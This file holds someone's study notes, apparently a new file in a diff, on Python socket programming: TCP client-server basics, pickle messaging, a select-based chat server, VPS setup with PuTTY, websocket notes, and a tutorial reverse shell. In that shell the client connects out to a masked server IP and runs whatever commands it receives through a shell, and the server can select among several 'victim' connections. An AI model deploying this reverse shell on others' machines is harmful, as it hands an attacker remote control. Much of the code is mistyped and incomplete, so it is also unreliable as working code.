@@ -1,0 +1,658 @@
+part 1
+
+server.py
+
+import socket  //built in library
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  //AF_INET cooresponds to IPv4, SOCK_STREAM correspond to TCP
+
+s.bind((socket.gethostname(),port_no))   //port_no may be 8080 // it is end point
+
+s.listen(5) // will have queue
+
+while True:
+	clientsocket, address = s.accept()
+	print(f"connection from {address} has been established!!")
+	clientsocket.send(bytes("welcome to the server", "utf-8"))
+	clientsocket.close() // to close the socket
+
+
+
+_________________________________________________________________________________
+client side socket programming
+
+import socket  //built in library
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  //AF_INET cooresponds to IPv4, SOCK_STREAM correspond to TCP
+s.connect((socket.gethostname(),port_no))
+
+msg = s.recv(1024)  //how big chunk we want to recieve //if set to 8 we only get "welcome" message :( entire message gone
+print(msg.decode("utf-8")) //decode bytes, if we set this 1024 to 8, then we get shorten message, and if we run this two lines in while True, then we will get buffered data, one by one
+			// or what we can do is append all the decoded message and merge them and print at last
+
+=========================
+
+py -3.7 server.py ===>to run on python 3, if various version avlbl
+
+>>>py -3.7 client.py
+////experience output
+
+_________________________________________________________________________________________________________________________________________
+
+part 2
+
+//maintain stream of data // by close socket :(
+
+//to keep stream open
+
+// solution is fixed length header
+
+import socket
+
+HEADERSIZE = 10
+
+msg = "Welcome to the server!"
+msg = f'{len(msg):<{HEADERSIZE}}' + msg
+#print(f'{len(msg):<10}+msg') //<10 spaces after length length included
+				//:< left allign
+				//:^ center allign text
+				//:> right allign
+
+clientsocket.send(bytes(msg, "utf-8"))
+
+===============================
+
+at client side
+
+while TRue
+
+	full_msg = ''
+	new_msg = True
+	while True:
+		msg = s.recv(16)
+		if new_msg:
+			print(f"new message length: {msg[:HEADERSIZE]}") 
+			msglen = int(msg[:HEADERSIZE])
+			new_msg = false
+
+		full_msg += msg.decode("utf-8")
+
+		if len(full_msg)-HEADERSIZE == msglen:
+			print("full msg escvd")
+			print(full_msg[HEADERSIZE:])
+			new_msg = True
+			full_msg = ''
+	print(full_msg)
+
+
+_________________________________________________________________________________________________________________________________________
+
+part 3
+
+serialization inpython or pickling or flattening
+
+=================================================
+
+import socket
+import time
+import pickle
+
+d = {1: "hey", 2: "There"}
+msg = pickle.dumps(d)
+
+msg = bytes(f'{len(msg):<}')
+
+//print(msg)
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+at client side
+
+import pickle
+
+// o need to decode anymore
+
+d = pickle.loads(full_msg[HEADERSIZE:])
+print(d)
+
+
+_________________________________________________________________________________________________________________________________________
+
+part 4
+
+broadcast-->distribution-->handling multiple connection-->
+
+import socket
+import select //OS level IO capability
+
+HEADER_LENGTH = 10
+IP = "127.0.0.1"
+PORT = 1234
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+server_socket.setsoockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) // to go to another port if port is in use
+
+server_socket.bind((IP, PORT))
+
+server_socket.listen()
+
+// manage list of client or socket
+
+socket_list = [server_socket]
+
+
+clients = {}
+
+
+
+def recieve_message(client_socket):
+
+	try:
+		message_header = client_socket.recv(HEADER_LENGTH)
+		
+		if not len(message_header):
+			return False
+			
+		message_length = int(message_header.decode("utf-8").strip())
+		return {"header": message_header, "data": client_socket.recv(message_length)}
+
+	except:
+		return False
+
+
+whilr True:
+	read_socket, _, exception_socket = select.select(sockets_list, [], sockets_list) //read_socket, [] = write socket, 3rd is socket that we are getting error
+	for notified_socket in read_sockets:
+		if notified_socket == server_socket: //if someone just connected
+			client_socket,client_address = server_socket.accept()
+
+			user = recieve_message(client_socket)
+				if user is False: // if someone disconnected
+					continue
+				socket_list.append(client_socket)
+				clients[client_socket] = user
+				print(f"Accepted new connection from {cliient_address[0]}:{cliient_address[0]} username:{user['data'].decode('utf-8')} ")
+		else:
+			message = recieve_message(notified_socket)
+			if message is False:
+			print(f"Closed connection from {client[notified_socket]['data'].decode('utf-8')}")				
+			socket_list.remove(notified_socket)
+			del clients[notified_socket]
+			continue
+
+			user = clients[notified_socket]
+			print(f"RECIEVD message from user['data'].decode("utf-8")"}: {message['data'].decode('utf-8')})
+
+			for client_socket in clients:
+				if client_socket != notified_socket:
+					client_socket.send(user['header'] + user['data'] + message['header'] + message['data']  )
+
+
+			for notified_socket in exception_socket:
+				socket_list.remove(notified_socker)
+				del clients[notified_socket]
+
+###########################################################################
+
+s.bind(addr,port) ==>bind for server
+s.connect(addr,port) ===>connect for client
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+____________________________________________________________________________________________________________________________________________________________
+
+with Tim
+
+https://techwithtim.net/tutorials/socket-programming/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sentdex--->youtube
+https://www.youtube.com/watch?v=Lbfe3-v7yE0
+
+
+____________________________________________________________
+
+E5===>
+
+create server with Digital ocean
+
+new ssh key in digital ocean==>
+
+google.com
+
+download putty===>here
+
+64-bit--->putty-64-bit.msi===>in folder===>putty.exe==>connection
+
+==>go to ssh==>auth===>private key file for authentication==>
+
+/////////
+
+puttygen.exe===>create public and private key==>move cursor==>save public and private key==>
+
+save public key on digital ocean===>
+
+===========
+
+putty.exe==>include private key==>in ssh==>authetication
+
+go to session==>set host name==>port keep it 22..no problem
+
+login===>using username ===>root
+
+____________________________________________________________
+
+E6===>pyhton network programming 1===>
+
+reverse shell==>intro
+
+____________________________________________________________
+
+E7===>pyhton network programming 2===>
+
+client.py ==>in local system
+
+server.py
+============
+import socket
+import sys   // to execute command in cmd
+
+
+#create a socket (connect two computer)
+
+
+____________________________________________________________
+
+pyhton network programming 3===>
+
+
+
+def create_socket():
+
+
+____________________________________________________________
+
+pyhton network programming 4===>
+
+def create_socket():
+	try:
+		global host
+		global port
+		global s
+		host = ""
+		port=9999 //uncommon port
+		s = socket.socket()
+	except socket.error as msg
+		print("socket erroe"+str(msg))
+
+# Binding a socket and listening for connection
+
+def bind_socket():
+	try:
+		global host
+		global port
+		global s
+		
+		printing("bindinh the port" + str(port))
+
+		s.bind((host,port))
+		s.listen(5) //no. of bad connection after that error and go to except
+	except socket.error as msg:
+		print("socket error "+ str(msg) + "\n" + "Retrying...")
+		bind_socket()
+
+def socket_accept():
+	conn, address = s.accept()
+	print("connection has been established! "+ "IP" + address[0] + "| port" + str(address[1]))
+	send_command(conn)
+	conn.close()
+
+
+____________________________________________________________
+
+pyhton network programming 5===>
+
+// will create send_command fn
+
+#send commands to client/victim or a friend
+def send_commands(conn):
+	while True:  //should not close the conn after sending the 1st command
+		cmd = input()
+		if cmd == 'quit':
+			conn.close()
+			s.close()
+			sys.exit()
+		if len(str.encode(cmd)) > 0:
+			conn.send(str.encode(cmd))
+			client_response = str(conn.recv(1024),"utf-8")
+			print(client_response, end="") //end="" // makes it go to new cursor
+
+def main():
+	create_socket()
+	bin_socket()
+	socket_accept()
+
+main()
+
+____________________________________________________________
+
+pyhton network programming 6=============>
+
+will be creating client.py
+
+==========================
+
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = '***.***....' //server Ip addr
+port = 9999
+
+s.connect((host,port))
+
+while True:
+	data = s.recv(1024)
+	if data[:2].decode("utf-8") == 'cd':
+		os.chdir(data[3:].decode("utf-8"))
+	
+	
+____________________________________________________________
+
+pyhton network programming 7=============>cont...
+	
+	if data[:2].decode("utf-8") == 'cd':
+		os.chdir(data[3:].decode("utf-8"))
+		
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) //Popen ==>to open terminal, shell===> to give acees like commands dir
+		output_byte = cmd.stdout.read() + cmd.stdout.read()
+		output_str = str(output_byte,"utf-8")
+		currentWD = os.getcwd() + ">"//
+		s.send(str.encode(output_str + currentWD))
+
+		print(output_str) // to print on clients computer
+
+
+
+		//byte character, or string character..to get on server
+
+
+____________________________________________________________
+
+pyhton network programming 8=============>cont...
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) //Popen ==>to open terminal, shell===> to give acees like commands dir
+		output_byte = cmd.stdout.read() + cmd.stdout.read()
+		output_str = str(output_byte,"utf-8")
+		currentWD = os.getcwd() + ">"//
+		s.send(str.encode(output_str + currentWD))
+
+		print(output_str) // to print on clients computer
+		//=========
+
+
+
+
+____________________________________________________________
+
+pyhton network programming 13=============>
+
+for i,conn in enumerate(all_connections):
+	try:
+		conn.send(str.encode(''))
+		conn.recv(201480)
+	except:
+		del all_connections[i]
+		del all_address[i]
+		continue
+	
+	result = ...."..."..
+
+
+____________________________________________________________
+
+pyhton network programming 14=============>
+
+def get_target(cmd): // to select specific connection  //cmd will have like = select 34
+	try:
+		target = cmd.replace('select ','')
+		target = int(target)
+		conn = all_connection[target]
+		ptint(str(all_address[target][0])+ ">", end="")  //end="" prevents to go to next line
+		
+	except:
+		print
+
+
+
+____________________________________________________________
+
+pyhton network programming 15=============>
+
+def send_commands(conn)
+
+while True:
+	try:
+
+
+____________________________________________________________
+
+pyhton network programming 16=============>
+
+//MultiThreading
+
+thread 1--->listen and connect
+
+thread 2-->sending commands
+
+worker threads--->
+
+t.daemon =True // to deallocate memore
+
+==============================
+//create threads
+
+no_of_thread = 2;
+JOB_NUMBER =[1,2]
+queue = Queue()
+
+def create_workers():
+	for _ in range(nu_of_threads):
+		t = threading.Thread(target=work)
+		t.daemon = True //whenever ends deallocate memory
+		t.start()
+
+
+def work():
+	while True:
+	x = queue.get()
+	if x==1:
+		create_socket()
+		bind_socket()
+		accept_connections()
+	if x==2:
+		start_turtle()
+	
+	queue.task_done()
+
+create_workers()
+create_jobs()
+
+
+def create_jobs():
+	for x in JOB_NUMBER:
+		queue.put(x)
+	queue.join()
+
+
+
+
+
+
+
+
+
+
+
+//https://github.com/attreyabhatt/Reverse-Shell/tree/master/Multi_Client%20(%20ReverseShell%20v2)
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+python websocket conference
+
+Application layer===>http, websockets, SSL
+
+interet layer ====> IPv4, Ipv6
+
+transport layer===>TCP,UDP
+
+===============================
+
+http===>stateless protocol===>like a tossing of coin
+
+specify action =>get, post,put,delete
+
+data sent with headers==>
+
+==========================
+
+web socket==>full duplex==>
+
+		==>http-upgrade ===>uses same tcp connection over ws:// or wss://
+
+		==>send header once
+
+		
+========================================
+
+web socket example===>
+
+polling and long polling===>
+
+websocket is not replacement for http==>
+
+use it when you want full duplex====>
+
+also has===>socketIO
+
+
+_________________________________________________________________________________________________________________
+
+python web socket
+
+
+import asyncio
+import websockets
+
+async def hello(websocket, path):
+    name = await websocket.recv()
+    print(f"< {name}")
+
+    greeting = f"Hello {name}!"
+
+    await websocket.send(greeting)
+    print(f"> {greeting}")
+
+start_server = websockets.serve(hello, "localhost", 1234)
+
+asyncio.get_event_loop().run_until_complete(start_server)
+asyncio.get_event_loop().run_forever()
+
+
+//https://websockets.readthedocs.io/en/stable/intro.html
+______________________________________________===============================================
+
+at client side==>Js
+
+const socket = new WebSocket('ws://localhost:1234');
+
+// Connection opened
+socket.addEventListener('open', function (event) {
+    socket.send('Hello Server!');
+});
+
+// Listen for messages
+socket.addEventListener('message', function (event) {
+    console.log('Message from server ', event.data);
+});
+
+
+//https://developer.mozilla.org/en-US/docs/Web/API/WebSocket
+
+//https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_client_applications
+
+
+_+_____________________________
+
+____________________________________________________________________
+in order to connect to any ip
+
+websockets.serve(handler, host='127.0.0.1', port=6969)
+provides a specific address on which the websockets server listens. Your server will only listen on that address; any requests to any other address will never be seen.
+
+From https://docs.python.org/3/library/asyncio-eventloop.html#asyncio.AbstractEventLoop.create_server :
+
+The host parameter can be a string, in that case the TCP server is bound to host and port. The host parameter can also be a sequence of strings and in that case the TCP server is bound to all hosts of the sequence. If host is an empty string or None, all interfaces are assumed and a list of multiple sockets will be returned (most likely one for IPv4 and another one for IPv6).
+
+You have bound your webserver to 127.0.0.1, which is a special address that only ever refers to the local machine. This address is also known as localhost. No other machine can ever connect to your localhost.
+
+The solution is to provide an empty string or None (the default value). In this case, your web server will listen for requests sent to any address.
+
+websockets.serve(handler, port=6969)
+
+
+https://stackoverflow.com/questions/45944199/python-websockets-cant-connect-over-internet
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+
+
+
+
+
+
+pycon.dionmisic.com/feed
+
+https://www.youtube.com/watch?v=FmaBZcQzL-Y
+
+caniuse.com===>to check what technology works on browser
